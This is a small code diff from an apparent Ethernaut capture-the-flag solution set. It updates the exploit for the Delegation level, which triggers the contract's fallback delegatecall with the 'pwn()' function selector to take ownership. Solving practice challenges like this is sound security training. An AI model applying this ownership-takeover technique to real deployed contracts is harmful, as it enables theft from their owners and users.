@@ -11,5 +11,7 @@ def test_lv06():
     ethernaut.check_lv06(contract)
 
 def exploit_lv06(contract: Delegation):
+    # Attack vector: insecure function in implementation contract
     # Training: delegatecall, fallback(), invoking function by function selector 
-    contract.transact(b"\xdd\x36\x5b\x8b")
+    function_selector = Abi.encode_with_signature("pwn()", [], [])
+    contract.transact(function_selector)
